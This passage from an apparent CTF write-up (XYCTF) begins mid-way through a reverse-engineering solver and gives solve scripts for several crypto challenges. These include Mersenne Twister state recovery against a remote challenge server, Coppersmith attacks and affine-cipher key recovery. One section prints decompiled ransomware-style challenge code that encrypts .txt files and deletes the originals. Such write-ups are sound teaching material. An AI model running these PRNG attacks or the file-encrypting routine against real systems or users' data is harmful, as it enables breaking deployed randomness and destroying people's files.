        0x0D6D6A3E, 0xCDD70692, 0x4DB26158, 0x8D080DF4, 0x17B7BE43, 0xD70DD2EF, 0xF9B9DF6E, 0x3903B3C2,
        0xA3BC0075, 0x63066CD9, 0xFED41B77, 0x3E6E77DB, 0xA4D1C46C, 0x646BA8C0, 0x4ADFA541, 0x8A65C9ED,
        0x10DA7A5A, 0xD06016F6, 0xF00F9345, 0x30B5FFE9, 0xAA0A4C5E, 0x6AB020F2, 0x44042D73, 0x84BE41DF,
        0x1E01F268, 0xDEBB9EC4, 0x4369E96A, 0x83D385C6, 0x196C3671, 0xD9D65ADD, 0xF762575C, 0x37D83BF0,
        0xAD678847, 0x6DDDE4EB, 0x76DC4190, 0xB6662D3C, 0x2CD99E8B, 0xEC63F227, 0xC2D7FFA6, 0x026D930A,
        0x98D220BD, 0x58684C11, 0xC5BA3BBF, 0x05005713, 0x9FBFE4A4, 0x5F058808, 0x71B18589, 0xB10BE925,
        0x2BB45A92, 0xEB0E363E, 0xCB61B38D, 0x0BDBDF21, 0x91646C96, 0x51DE003A, 0x7F6A0DBB, 0xBFD06117,
        0x256FD2A0, 0xE5D5BE0C, 0x7807C9A2, 0xB8BDA50E, 0x220216B9, 0xE2B87A15, 0xCC0C7794, 0x0CB61B38,
        0x9609A88F, 0x56B3C423, 0xD6D6A3E9, 0x166CCF45, 0x8CD37CF2, 0x4C69105E, 0x62DD1DDF, 0xA2677173,
        0x38D8C2C4, 0xF862AE68, 0x65B0D9C6, 0xA50AB56A, 0x3FB506DD, 0xFF0F6A71, 0xD1BB67F0, 0x11010B5C,
        0x8BBEB8EB, 0x4B04D447, 0x6B6B51F4, 0xABD13D58, 0x316E8EEF, 0xF1D4E243, 0xDF60EFC2, 0x1FDA836E,
        0x856530D9, 0x45DF5C75, 0xD80D2BDB, 0x18B74777, 0x8208F4C0, 0x42B2986C, 0x6C0695ED, 0xACBCF941,
        0x36034AF6, 0xF6B9265A, 0xCCCCCCCC, 0xCCCCCC00, 0x00000100, 0x00000000, 0xF6B9265A, 0xCCCCCCCC,
        0x00000008, 0x00000000};

    uint32_t enc1[]{
        0x46A95BAD,
        0x1CAC84B6,
        0xA67CB2B2,
        0x32188937,
        0x4872D39F,
        0xF2A2E59B,
        0x011B94D2,
    };

    // 爆破前7字节
    for (int i = 0; i < 7; i++)
    {
        for (int c = 28; c < 132; c++)
        {
            if ((~box1[(uint8_t)c ^ 0x79] ^ 0xB0E0E879) == enc1[i])
            {
                printf("%c", c);
                break;
            }
        }
    }

    // 后16字节进行IDEA解密
    unsigned char enc2[16] = {
        0x5C, 0x2F, 0xD0, 0xEC, 0x82, 0x0E, 0x67, 0x57,
        0x6A, 0x9F, 0x91, 0xF6, 0x95, 0xA4, 0xAC, 0x90};
    // unsigned int key[4] = {
    //     0x42B2986C, 0x12345678, 0x0D6D6A3E, 0x89ABCDEF};
    unsigned int key[4] = {
        0x6C98B242, 0x78563412, 0x3E6A6D0D, 0xEFCDAB89};

    code keys_input[8];
    for (int i = 0; i < 4; i++)
    {
        keys_input[2 * i + 1] = key[i] & 0xFFFF;
        keys_input[2 * i] = (key[i] >> 16) & 0xFFFF;
    }

    unsigned char result[16];
    bitset<64> cipher1, cipher2;
    for (int i = 0; i < 8; i++)
    {
        for (int j = 0; j < 8; j++)
        {
            cipher1[63 - (i * 8 + j)] = (enc2[i] >> (7 - j)) & 1;
            cipher2[63 - (i * 8 + j)] = (enc2[i + 8] >> (7 - j)) & 1;
        }
    }
    subkeys_get(keys_input);
    inv_subkeys_get(sub_key);

    bitset<64> plain1 = dencrypt(cipher1);
    bitset<64> plain2 = dencrypt(cipher2);

    uint64_t plain1_val = plain1.to_ullong();
    uint64_t plain2_val = plain2.to_ullong();

    uint8_t dec2[16]{};
    memcpy(dec2, &plain2_val, 8);
    memcpy(dec2 + 8, &plain1_val, 8);
    reverse(dec2, dec2 + 16);

    printf("%.16s\n", dec2);
    return 0;
}
```

flag{moshui_build_this_block}



## Crypto

### Division

```python
while True:
    choose = input(': >>> ')
    if choose == '1':
        try:
            denominator = int(input('input the denominator: >>> '))
        except:
            print('INPUT NUMBERS')
            continue
        nominator = random.getrandbits(32)
        if denominator == '0':
            print('NO YOU DONT')
            continue
        else:
            print(f'{nominator}//{denominator} = {nominator//denominator}')

```

题目可以任意获取32字节的数据，直接使用现有的mt19937攻击库即可预测随机数

```python
from pwn import *
from randcrack import RandCrack
from tqdm import tqdm

context.log_level = 'debug'
sh=remote("47.94.217.82",28739 )
data=[]
for i in range(624):
    sh.recvuntil(b'>>> ')
    sh.sendline(b'1')
    sh.recvuntil(b'tor: >>> ')
    sh.sendline(b'1')
    line=int(sh.recvline().decode().split('=')[1].replace('\n', '').replace(' ', ''))
    data.append(line)

print(data)


RC = RandCrack()
for i in data:
    RC.submit(i)

sh.sendline(b'2')
sh.recvuntil(b'er: >>>')
rand1 = RC.predict_getrandbits(11000)
rand2 = RC.predict_getrandbits(10000)
correct_ans = rand1 // rand2

sh.sendline(str(correct_ans).encode())
sh.recvlines()  
```

> XYCTF{4c4e5327-9cd0-4fb6-b584-878afdffb850}

### Complex_signin

题目构造了复数对象，混淆了m的实部和虚部的低128位,已知

![cry1](/images/cry1-1744626745339-67.png)

二元copper解低位即可

```python
from Crypto.Util.number import *
from Crypto.Cipher import ChaCha20
import hashlib
import itertools

def small_roots(f, bounds, m=1, d=None):
    if not d:
        d = f.degree()

    R = f.base_ring()
    N = R.cardinality()

    f /= f.coefficients().pop(0)
    f = f.change_ring(ZZ)

    G = Sequence([], f.parent())
    for i in range(m + 1):
        base = N ^ (m - i) * f ^ i
        for shifts in itertools.product(range(d), repeat=f.nvariables()):
            g = base * prod(map(power, f.variables(), shifts))
            G.append(g)

    B, monomials = G.coefficient_matrix()
    monomials = vector(monomials)

    factors = [monomial(*bounds) for monomial in monomials]
    for i, factor in enumerate(factors):
        B.rescale_col(i, factor)

    B = B.dense_matrix().LLL()

    B = B.change_ring(QQ)
    for i, factor in enumerate(factors):
        B.rescale_col(i, 1 / factor)

    H = Sequence([], f.parent().change_ring(QQ))
    for h in filter(None, B * monomials):
        H.append(h)
        I = H.ideal()
        if I.dimension() == -1:
            H.pop()
        elif I.dimension() == 0:
            roots = []
            for root in I.variety(ring=ZZ):
                root = tuple(R(root[var]) for var in f.variables())
                roots.append(root)
            return roots

    return []


class Complex:
    def __init__(self, re, im):
        self.re = re
        self.im = im

    def __mul__(self, c):
        re_ = self.re * c.re - self.im * c.im
        im_ = self.re * c.im + self.im * c.re
        return Complex(re_, im_)

    def __eq__(self, c):
        return self.re == c.re and self.im == c.im

    def __rshift__(self, m):
        return Complex(self.re >> m, self.im >> m)

    def __lshift__(self, m):
        return Complex(self.re << m, self.im << m)

    def __str__(self):
        if self.im == 0:
            return str(self.re)
        elif self.re == 0:
            if abs(self.im) == 1:
                return f"{'-' if self.im < 0 else ''}i"
            else:
                return f"{self.im}i"
        else:
            return f"{self.re} {'+' if self.im > 0 else '-'} {abs(self.im)}i"

    def tolist(self):
        return [self.re, self.im]


def complex_pow(c, exp, n):
    result = Complex(1, 0)
    while exp > 0:
        if exp & 1:
            result = result * c
            result.re = result.re % n
            result.im = result.im % n
        c = c * c
        c.re = c.re % n
        c.im = c.im % n
        exp >>= 1
    return result

n = 24240993137357567658677097076762157882987659874601064738608971893024559525024581362454897599976003248892339463673241756118600994494150721789525924054960470762499808771760690211841936903839232109208099640507210141111314563007924046946402216384360405445595854947145800754365717704762310092558089455516189533635318084532202438477871458797287721022389909953190113597425964395222426700352859740293834121123138183367554858896124509695602915312917886769066254219381427385100688110915129283949340133524365403188753735534290512113201932620106585043122707355381551006014647469884010069878477179147719913280272028376706421104753
mh = [3960604425233637243960750976884707892473356737965752732899783806146911898367312949419828751012380013933993271701949681295313483782313836179989146607655230162315784541236731368582965456428944524621026385297377746108440938677401125816586119588080150103855075450874206012903009942468340296995700270449643148025957527925452034647677446705198250167222150181312718642480834399766134519333316989347221448685711220842032010517045985044813674426104295710015607450682205211098779229647334749706043180512861889295899050427257721209370423421046811102682648967375219936664246584194224745761842962418864084904820764122207293014016, 15053801146135239412812153100772352976861411085516247673065559201085791622602365389885455357620354025972053252939439247746724492130435830816513505615952791448705492885525709421224584364037704802923497222819113629874137050874966691886390837364018702981146413066712287361010611405028353728676772998972695270707666289161746024725705731676511793934556785324668045957177856807914741189938780850108643929261692799397326838812262009873072175627051209104209229233754715491428364039564130435227582042666464866336424773552304555244949976525797616679252470574006820212465924134763386213550360175810288209936288398862565142167552]
C = [5300743174999795329371527870190100703154639960450575575101738225528814331152637733729613419201898994386548816504858409726318742419169717222702404409496156167283354163362729304279553214510160589336672463972767842604886866159600567533436626931810981418193227593758688610512556391129176234307448758534506432755113432411099690991453452199653214054901093242337700880661006486138424743085527911347931571730473582051987520447237586885119205422668971876488684708196255266536680083835972668749902212285032756286424244284136941767752754078598830317271949981378674176685159516777247305970365843616105513456452993199192823148760, 21112179095014976702043514329117175747825140730885731533311755299178008997398851800028751416090265195760178867626233456642594578588007570838933135396672730765007160135908314028300141127837769297682479678972455077606519053977383739500664851033908924293990399261838079993207621314584108891814038236135637105408310569002463379136544773406496600396931819980400197333039720344346032547489037834427091233045574086625061748398991041014394602237400713218611015436866842699640680804906008370869021545517947588322083793581852529192500912579560094015867120212711242523672548392160514345774299568940390940653232489808850407256752]
enc = b'\x9c\xc4n\x8dF\xd9\x9e\xf4\x05\x82!\xde\xfe\x012$\xd0\x8c\xaf\xfb\rEb(\x04)\xa1\xa6\xbaI2J\xd2\xb2\x898\x11\xe6x\xa9\x19\x00pn\xf6rs- \xd2\xd1\xbe\xc7\xf51.\xd4\xd2 \xe7\xc6\xca\xe5\x19\xbe'

PR.<x,y>=Zmod(int(n))[]
a=mh[0]+x
b=mh[1]+y
f1=a^3-3*a*b^2-C[0]

roots=small_roots(f1,bounds=(2**129,2**129),m=5,d=3)
print(roots[0])

m=Complex(mh[0]+roots[0][0],mh[1]+roots[0][1])
print(str(m.re + m.im))

dec=ChaCha20.new(key=hashlib.sha256(str(m.re + m.im).encode()).digest(), nonce=b'Pr3d1ctmyxjj')
print(dec.decrypt(enc))
```

> XYCTF{Welcome_to_XYCTF_Now_let_us_together_play_Crypto_challenge}

### 勒索病毒

题目给出了exe和加密的16进制数据

pyinstxtractor反编译一下，编译task.pyc看到注释的代码

```python
import re
import base64
import os
import sys
from gmssl import sm4
from Crypto.Util.Padding import pad
import binascii
from random import shuffle, randrange

N = 49 
p = 3
q = 128  
d = 3
assert q > (6 * d + 1) * p
R.<x> = ZZ[]
def generate_T(d1, d2):
    assert N >= d1 + d2
    s = [1] * d1 + [-1] * d2 + [0] * (N - d1 - d2)
    shuffle(s)
    return R(s)

def invert_mod_prime(f, p):
    Rp = R.change_ring(Integers(p)).quotient(x^N - 1)
    return R(lift(1 / Rp(f)))

def convolution(f, g):
    return (f * g) % (x^N - 1)

def lift_mod(f, q):
    return R([((f[i] + q // 2) % q) - q // 2 for i in range(N)])

def poly_mod(f, q):
    return R([f[i] % q for i in range(N)])

def invert_mod_pow2(f, q):
    assert q.is_power_of(2)
    g = invert_mod_prime(f, 2)
    while True:
        r = lift_mod(convolution(g, f), q)
        if r == 1:
            return g
        g = lift_mod(convolution(g, 2 - r), q)

def generate_message():
    return R([randrange(p) - 1 for _ in range(N)])

def generate_key():
    while True:
        try:
            f = generate_T(d + 1, d)
            g = generate_T(d, d)
            Fp = poly_mod(invert_mod_prime(f, p), p)
            Fq = poly_mod(invert_mod_pow2(f, q), q)
            break
        except:
            continue
    h = poly_mod(convolution(Fq, g), q)
    return h, (f, g)

def encrypt_message(m, h):
    e = lift_mod(p * convolution(h, generate_T(d, d)) + m, q)
    return e

def save_ntru_keys():
    h, secret = generate_key()
    with open("pub_key.txt", "w") as f:
        f.write(str(h))
    m = generate_message()
    with open("priv_key.txt", "w") as f:
        f.write(str(m))
    e = encrypt_message(m, h)
    with open("enc.txt", "w") as f:
        f.write(str(e))

def terms(poly_str):
    terms = []
    pattern = r'([+-]?\s*x\^?\d*|[-+]?\s*\d+)'
    matches = re.finditer(pattern, poly_str.replace(' ', ''))

    for match in matches:
        term = match.group()
        if term == '+x' or term == 'x':
            terms.append(1)
        elif term == '-x':
            terms.append(-1)
        elif 'x^' in term:
            coeff_part = term.split('x^')[0]
            exponent = int(term.split('x^')[1])
            if not coeff_part or coeff_part == '+':
                coeff = 1
            elif coeff_part == '-':
                coeff = -1
            else:
                coeff = int(coeff_part)
            terms.append(coeff * exponent)
        elif 'x' in term:
            coeff_part = term.split('x')[0]
            if not coeff_part or coeff_part == '+':
                terms.append(1)
            elif coeff_part == '-':
                terms.append(-1)
            else:
                terms.append(int(coeff_part))
        else:
            if term == '+1' or term == '1':
                terms.append(0)
                terms.append(-0)
    return terms

def gen_key(poly_terms):
    binary = [0] * 128
    for term in poly_terms:
        exponent = abs(term)
        if term > 0 and exponent <= 127:  
            binary[127 - exponent] = 1
    binary_str = ''.join(map(str, binary))
    hex_key = hex(int(binary_str, 2))[2:].upper().zfill(32)
    return hex_key

def read_polynomial_from_file(filename):
    with open(filename, 'r') as file:
        return file.read().strip()

def sm4_encrypt(key, plaintext):
    assert len(key) == 16, "SM4 key must be 16 bytes"
    cipher = sm4.CryptSM4()
    cipher.set_key(key, sm4.SM4_ENCRYPT)
    padded_plaintext = pad(plaintext, 16)
    return cipher.crypt_ecb(padded_plaintext)

def sm4_encrypt_file(input_path, output_path, key):
    with open(input_path, 'rb') as f:
        plaintext = f.read()
    
    ciphertext = sm4_encrypt(key, plaintext)
    
    with open(output_path, 'wb') as f:
        f.write(ciphertext)

def resource_path(relative_path):
    if getattr(sys, 'frozen', False):
        base_path = sys._MEIPASS
    else:
        base_path = os.path.abspath(".")
    return os.path.join(base_path, relative_path)

def encrypt_directory(directory, sm4_key, extensions=[".txt"]):
    if not os.path.exists(directory):
        print(f"Directory does not exist: {directory}")
        return
    
    for root, _, files in os.walk(directory):
        for file in files:
            if any(file.endswith(ext) for ext in extensions):
                input_path = os.path.join(root, file)
                output_path = input_path + ".enc"
                
                try:
                    sm4_encrypt_file(input_path, output_path, sm4_key)
                    os.remove(input_path)
                    print(f"Encrypted: {input_path} -> {output_path}")
                except Exception as e:
                    print(f"Error encrypting {input_path}: {str(e)}")

def main():
    try:
        save_ntru_keys()
        poly_str = read_polynomial_from_file("priv_key.txt")
        poly_terms = terms(poly_str)
        sm4_key = binascii.unhexlify(poly_terms)
        user_name = os.getlogin()
        target_dir = os.path.join("C:\Users", user_name, "Desktop", "test_files")
        
        if not os.path.exists(target_dir):
            os.makedirs(target_dir, exist_ok=True)
            print(f"Created directory: {target_dir}")
            return
            
        txt_files = [f for f in os.listdir(target_dir) 
                    if f.endswith('.txt') and os.path.isfile(os.path.join(target_dir, f))]
        
        if not txt_files:
            print("No .txt files found in directory")
            return
            
        for txt_file in txt_files:
            file_path = os.path.join(target_dir, txt_file)
            try:
                with open(file_path, 'rb') as f:
                    test_data = f.read()
                
                ciphertext = sm4_encrypt(sm4_key, test_data)
                encrypted_path = file_path + '.enc'
                
                with open(encrypted_path, 'wb') as f:
                    f.write(ciphertext)
            except Exception as e:
                print(f"Error processing {txt_file}: {str(e)}")
                
    except Exception as e:
        print(f"Fatal error: {str(e)}")

if __name__ == "__main__":
    main()
```

发现将是多项式m转换为SM4密钥加密，p，d=3本来应该对enc多项式取模获得m，但是发现反编译出的文件有enc.txt和pub_key.txt，其中enc.txt里有两个多项式，使用第二个居然可以直接解密。

```python
from gmssl import sm4
import binascii
import re

def terms(poly_str):
    terms = []
    pattern = r'([+-]?\s*x\^?\d*|[-+]?\s*\d+)'
    matches = re.finditer(pattern, poly_str.replace(' ', ''))
    
    for match in matches:
        print(match)
        term = match.group()
        if term == '+x' or term == 'x':
            terms.append(1)
        elif term == '-x':
            terms.append(-1)
        elif 'x^' in term:
            coeff_part = term.split('x^')[0]
            exponent = int(term.split('x^')[1])
            if not coeff_part or coeff_part == '+':
                coeff = 1
            elif coeff_part == '-':
                coeff = -1
            else:
                coeff = int(coeff_part)
            terms.append(coeff * exponent)
        elif 'x' in term:
            coeff_part = term.split('x')[0]
            if not coeff_part or coeff_part == '+':
                terms.append(1)
            elif coeff_part == '-':
                terms.append(-1)
            else:
                terms.append(int(coeff_part))
        else:
            if term == '+1' or term == '1':
                terms.append(0)
                terms.append(-0)
    
    return terms

# 解密函数
def sm4_decrypt(key_hex, ciphertext_hex):
    key = binascii.unhexlify(key_hex)
    print(len(key))
    cipher = sm4.CryptSM4()
    cipher.set_key(key, sm4.SM4_DECRYPT)
    ciphertext = binascii.unhexlify(ciphertext_hex)
    print(ciphertext)
    plaintext = cipher.crypt_ecb(ciphertext)
    return plaintext

def sm4_encrypt(key, plaintext):
    assert len(key) == 16, "SM4 key must be 16 bytes"
    cipher = sm4.CryptSM4()
    cipher.set_key(key, sm4.SM4_ENCRYPT)
    padded_plaintext = pad(plaintext, 16)
    return cipher.crypt_ecb(padded_plaintext)


m="-x^48 - x^46 + x^45 + x^43 - x^42 + x^41 + x^40 + x^36 - x^35 + x^34 - x^33 + x^32 - x^30 + x^29 - x^28 - x^27 - x^26 - x^25 - x^23 - x^22 + x^21 + x^20 + x^19 + x^18 - x^17 - x^16 - x^15 - x^14 - x^12 + x^9 - x^7 - x^6 - x^5 - x^4 + x^3 - x + 1"
m_ = terms(m)
print(m_)

def gen_key(poly_terms):
    binary = [0] * 128
    for term in poly_terms:
        exponent = abs(term)
        if term > 0 and exponent <= 127:  
            binary[127 - exponent] = 1
    binary_str = ''.join(map(str, binary))
    hex_key = hex(int(binary_str, 2))[2:].upper().zfill(32)
    return hex_key

hex_key = gen_key(m_)
print(hex_key)

encrypted_flag = "bf0cb5cc6bea6146e9c1f109df953a57daa416d38a8ffba6438e7e599613e01f3b9a53dace4ccd55cd3e55ef88e0b835"
flag = sm4_decrypt(hex_key, encrypted_flag)
print("Decrypted Flag:", flag)
```

XYCTF{Crypto0_can_n0t_So1ve_it}



### reed

题目给出一个基于random的随机数生成器

但是观察密文前两组是一样的，是同一个字符，根据出题人给出的其他参数，推测flag前几位是114514

有两个不一样的m即可两组enc相减乘m差值的逆元获得a，即可获得a，b。解密即可

```python
import string
import random

table = string.ascii_letters + string.digits

r = random.Random()

class PRNG:
    def __init__(self, seed):
        self.a = 1145140
        self.b = 19198100
        random.seed(seed)

    def next(self):
        x = random.randint(self.a, self.b)
        random.seed(x ** 2 + 1)
        return x
    
    def round(self, k):
        for _ in range(k):
            x = self.next()
        return x

def encrypt(msg, a, b):
    c = [(a * table.index(m) + b) % 19198111 for m in msg]
    return c
from Crypto.Util.number import *

enc=[10452836, 10452836, 9474070, 15547185, 10452836, 9474070, 6914981, 5936215, 1042385, 841866, 13966862, 10051798, 3978683, 5936215, 17103679, 15146147, 5936215, 9073032, 9073032, 3978683, 13966862, 14945628, 17103679, 12988096, 841866, 2999917, 3978683, 2021151, 9073032, 10452836, 1443423, 10452836, 1443423, 14568419, 10452836, 4379721]

prng = PRNG(0)

flag='114'

encc=enc[0]-enc[2]
inv_e=inverse(table.index('1')-table.index('4'),19198111)
print(inv_e)

amod=(enc[0]-enc[2])*inv_e%19198111
print(amod)
inv_a=inverse(amod,19198111)
print(inv_a)
b=enc[0]-amod*table.index('1')%19198111

for i in enc:
    print(table[((i-b)*inv_a%19198111)],end='')



```

114514fixedpointissodangerous1919810



### choice

```python
from Crypto.Util.number import bytes_to_long
from random import Random
from secret import flag

assert flag.startswith(b'XYCTF{') and flag.endswith(b'}')
flag = flag[6:-1]

msg = bytes_to_long(flag)
rand = Random()
test = bytes([i for i in range(255, -1, -1)])
open('output.py', 'w').write(f'enc = {msg ^ rand.getrandbits(msg.bit_length())}\nr = {[rand.choice(test) for _ in range(2496)]}')
```

给了2496组choice()，查看源码发现和getrandbits(8)相当，根据索引构建矩阵求解即可复原state，使用extend_mt19937_predictor溯源即可

m长度可能与e有偏差，多试两位即可

```python
from Crypto.Util.number import *
from random import *
from tqdm import *


with open("/mnt/e/wenjian/p/timu/xyCTF/2025/choice/output.py","r") as f:
    e=int(f.readline().split("=")[1])
    r=eval(f.read().split("=")[1])

test = bytes([i for i in range(255, -1, -1)])

Dall=[]
for i in r:
    Dall.append(test.index(i))


print(e)
print(Dall)
print(len(Dall))
f.close()

n=len(Dall)
D=Dall
rng=Random()

def getRows(rng):
    #这一部分根据题目实际编写，必须和题目实际比特获取顺序和方式完全一致，且确保比特数大于19937，并且请注意zfill。
    row=[]
    for i in range(n):
        row+=list(map(int, (bin(rng.getrandbits(32)>>(32-8))[2:].zfill(8))))
    return row
M=[]

for i in range(19968):#这一部分为固定套路，具体原因已经写在注释中了

    state = [0]*624
    temp = "0"*i + "1"*1 + "0"*(19968-1-i)
    for j in range(624):
        state[j] = int(temp[32*j:32*j+32],2)
    rng.setstate((3,tuple(state+[624]),None)) #这个setstate也是固定格式，已于2025.1.21测试
    M.append(getRows(rng))


M=Matrix(GF(2),M)
print(M.rank())


y=[]
for i in range(n):
    y+=list(map(int, (bin(D[i])[2:].zfill(8))))

print(len(y))
print('--------------------------------------------------------------------------------------')

y=vector(GF(2),y)
s=M.solve_left(y)


G=[]
for i in range(624):
    C=0
    for j in range(32):
        C<<=1
        C|=int(s[32*i+j])
    G.append(C)

import random
RNG1 = random.Random()
for i in range(624):
    G[i]=int(G[i])
print(G)


# G=[0, 490535307, 1496475985, 1304389653, 3073248862, 2386441930, 1822503478, 2020774719, 4023824107, 1480116190, 3595911337, 4199707216, 669968687, 826798707, 2615625545, 3915683430, 168325080, 829537011, 1165965885, 981460179, 2661311210, 316250339, 1045607037, 2688190930, 118171210, 3451453216, 3866477339, 2868202172, 1761379194, 1058828879, 1542168919, 2021772452, 2569206428, 2418006454, 3114112729, 1682301179, 3200486818, 599215990, 3404606484, 1911329240, 3444584517, 2269914870, 2733846467, 2801800027, 248142392, 1885498765, 860592907, 1802543044, 2381250266, 858114164, 2518994312, 962044368, 973015259, 3942118714, 3680009016, 2032313670, 3387751989, 1054484707, 2636564424, 1944206009, 2577425725, 1603497474, 392224733, 1859494210, 3997782846, 4192576547, 1107246885, 2404750701, 2157620568, 270457783, 2445196691, 3937008468, 3121127879, 2378519387, 425217735, 2564663584, 686095178, 2624185419, 3971886279, 2680818161, 2787863330, 2110546597, 687271821, 2277728162, 2803200905, 1049854254, 167450062, 3024645977, 3863615534, 423262694, 2034761849, 969338715, 1511630961, 2649226142, 366301301, 2130366793, 1560835738, 3571705620, 3487936619, 839414948, 1316270660, 568821823, 763054927, 2908961603, 1102984025, 3749009029, 449320085, 1308343884, 4157952695, 3187534659, 1580220597, 2173463099, 1595396219, 560342012, 3540854382, 370188528, 2936067839, 3845682323, 2060758533, 2636537833, 2045197349, 1945678739, 1987702201, 1386018091, 3389849161, 3658584265, 1063584606, 1609671890, 2147966037, 408763514, 173407274, 3026893195, 782093047, 612664728, 2008637303, 2231388523, 376518271, 2459748419, 2989539508, 1291508175, 739599924, 2787615130, 438993275, 3419636363, 396288162, 890864194, 2703944810, 2855282142, 3822277049, 2097517145, 3561662446, 3033564783, 1419618886, 1113476278, 1207289994, 51062508, 2200207646, 270434158, 3368286735, 1919259101, 2520477581, 3490526248, 575225377, 3390786656, 685824799, 2700369515, 1002309859, 71116734, 2055482703, 2658054435, 1094192336, 1947555707, 2442909426, 3499290994, 4054825654, 4162150808, 595324989, 2564147367, 2210623235, 3240656068, 2974526728, 1097736460, 3789121430, 990080517, 455497279, 591810412, 2723818619, 1828779877, 3360239376, 3698746341, 1962766646, 3891940910, 194869848, 3113141597, 4173680019, 2492879487, 1782458264, 2644873038, 3057000015, 1477560683, 260635038, 4014541913, 2475381256, 3432141583, 1449600258, 1806521550, 3993006180, 1144296388, 291996587, 2791231577, 2014376521, 3385338386, 3917594173, 4112262622, 3881010559, 1879348257, 4088686127, 943465051, 2717992292, 281219314, 829214474, 1429253889, 896560967, 4022504673, 1679700533, 4084224237, 3205942608, 3596088508, 2112079603, 3786503446, 2339855853, 358914192, 1821223774, 3764762766, 574390400, 230757101, 1681353616, 1404353461, 474457722, 818843357, 1916555525, 1478313262, 1376597702, 1725676847, 2410606224, 160362913, 165431882, 679714160, 578803644, 1251384768, 781503133, 252645721, 1216677581, 745854028, 4257762445, 232057782, 4131450922, 2243258111, 2680095923, 2131010707, 1945987666, 3649103696, 1306908197, 3923095658, 1586814958, 4275479481, 1792900040, 3513683706, 3043365645, 1598493028, 32483759, 212292997, 2484980536, 833036523, 446172640, 469599570, 1783543378, 34817764, 381132111, 1816020014, 3267362667, 223013760, 3717861858, 1981643591, 3438213528, 1159293740, 1087473027, 1845306386, 1597047436, 811182716, 4036992807, 866266593, 2817126195, 2583634769, 4227649879, 2672651673, 1158298570, 1147396726, 2938397432, 1542609148, 4196176929, 4064670511, 2395573335, 529637852, 4218916776, 2144528354, 1480788832, 1397451235, 1376724653, 2972863103, 3126088025, 1754053571, 61572923, 1962366418, 3209345005, 1135973797, 2282020151, 1617329326, 2165555451, 1335819294, 4274157719, 26224158, 836546160, 1863920790, 3735102502, 226852542, 621648448, 2125683057, 2719749744, 2624596686, 1627646676, 1476402803, 1157882819, 2139666545, 4224008503, 538777205, 160235477, 1389743733, 4255663843, 1232932267, 714165924, 3360017571, 3861531699, 1259644568, 1889531702, 3835320074, 962334880, 2655642856, 2626363498, 1891384806, 1801620109, 1897599626, 3687809766, 1522030816, 1513382903, 3712790758, 3610944389, 2016393056, 1006803814, 517272163, 2093521873, 3521116957, 365700165, 127017649, 1034144380, 383768854, 814208276, 794839368, 2538604191, 1941513101, 1342716317, 3555862634, 856481495, 2490707626, 3583375428, 2805836257, 245564123, 3108295323, 1565518856, 2649180690, 3332256362, 332138267, 2753126792, 1373150168, 3689890710, 223149061, 2451398005, 2044764250, 253027501, 3654914798, 3071035850, 4073951612, 690760932, 2576679227, 1899001759, 3179694571, 549833987, 3103159161, 2749555997, 3701137981, 103780406, 3880550485, 641014351, 614977565, 3252106272, 1500800921, 2346355748, 1437619729, 3713115526, 4169303983, 953535013, 722731441, 3485174363, 1123805551, 596536035, 1466804419, 3185872953, 2541958005, 909181586, 2235810910, 2325856501, 1907373845, 3395068733, 3727013849, 3129841537, 2209755148, 386103378, 959714264, 4059368152, 3171578698, 1935673297, 1334114851, 2000714717, 291544611, 2924507130, 1118846473, 834320931, 290128353, 758935454, 1295926016, 1596770824, 1977132939, 3804148806, 3591309623, 4209845635, 2998785209, 3353138216, 1739365771, 228727322, 2787865152, 4064361337, 3898185832, 628696008, 805010811, 2283970114, 261773773, 373115591, 2811158375, 2209330766, 476245752, 2727559206, 729386039, 3598648760, 227347764, 2772461981, 3927693335, 772797350, 1215579938, 1991587620, 1968980116, 213188572, 1455236565, 646373577, 3221190285, 2407608088, 388710597, 3068317471, 560173616, 2384843322, 2804823319, 3296469232, 4132838759, 1166039793, 1651089967, 1217559362, 1466724612, 3066497469, 2542065239, 1548132571, 2252598557, 1114227092, 315950281, 4260294426, 390016269, 237846157, 666128591, 4104218965, 4052610947, 2880940708, 679949465, 3265033554, 2618804058, 1983265063, 3934746131, 3851626972, 2695590210, 277341758, 2496522831, 2390301598, 1237676785, 541056536, 559487185, 878088736, 1654760693, 3091440937, 4184991854, 4277345620, 4128668672, 3475002233, 1191304304, 410233597, 1753481581, 522497440, 3490095733, 1740782454, 279075776, 4111542987, 1488482616, 2358022381, 2420694338, 4051823347, 2839869382, 700753851, 4187502580, 3609799609, 3816223830, 3465776160, 2643572446, 2117522904, 337820788, 4095876916, 4027724494, 3030168724, 2966453700, 750155676, 2187990790, 1012578929, 1502179669, 1028354250, 3886098849, 422175433, 1312545625, 3002465781, 1095759919, 364274776, 608451515, 539138648, 3725177121, 2681745835, 2060057886, 2467932655, 1328800475, 3777619753, 871763400, 3312924583, 2674204807, 4159118820, 3502457342, 3533526784, 2392773867, 3758459535, 313416918, 2746154645, 2040485405, 3212871698, 3744071701, 1518338816, 2076259952, 2344700130, 3755882401, 1001438918, 2331345786, 573931854, 371837673, 2890869138, 773771187, 2205676903, 1136370498, 1687795223, 3691084510, 2583108857, 1618641671, 1809021081, 3933440855, 2749174598, 530562158, 2653872255, 2070076429, 467552727, 577607036, 459715927, 1232385236, 495255405, 225866996, 3871108981, 565101302, 373456503, 1504979081, 761278333, 2227115284, 3700809837, 3597612966, 517375768, 108496019, 2916932837, 2100375706, 746007798, 216873417, 3182230215, 3523337342, 365334474, 612842567, 532858878, 3162228125]

for i in range(624):
    G[i]=int(G[i])
    

import random
RNG1 = random.Random()
RNG1.setstate((int(3),tuple(G+[int(624)]),None))


from extend_mt19937_predictor import ExtendMT19937Predictor

predictor = ExtendMT19937Predictor()

for _ in range(624):
    predictor.setrandbits(RNG1.getrandbits(32), 32)

for _ in range(624):
    predictor.backtrack_getrandbits(32)
    
key=predictor.backtrack_getrandbits(e.bit_length()+3)

from Crypto.Util.number import *

print(long_to_bytes(e^^key))
```

___0h_51mple_r@nd0m___



### 复复复复数

四元数的逆元为其共轭数除以模长的平方，根据已知可以求得p，q，r

但是e有个因子3，但是m其实十分小，计算阶然后除以公因数即可直接解出

```python
class ComComplex:
    def __init__(self, value=[0,0,0,0]):
        self.value = value
    def __str__(self):
        s = str(self.value[0])
        for k,i in enumerate(self.value[1:]):
            if i >= 0:
                s += '+'
            s += str(i) +'ijk'[k]
        return s
    def __add__(self,x):
        return ComComplex([i+j for i,j in zip(self.value,x.value)])
    def __mul__(self,x):
        a = self.value[0]*x.value[0]-self.value[1]*x.value[1]-self.value[2]*x.value[2]-self.value[3]*x.value[3]
        b = self.value[0]*x.value[1]+self.value[1]*x.value[0]+self.value[2]*x.value[3]-self.value[3]*x.value[2]
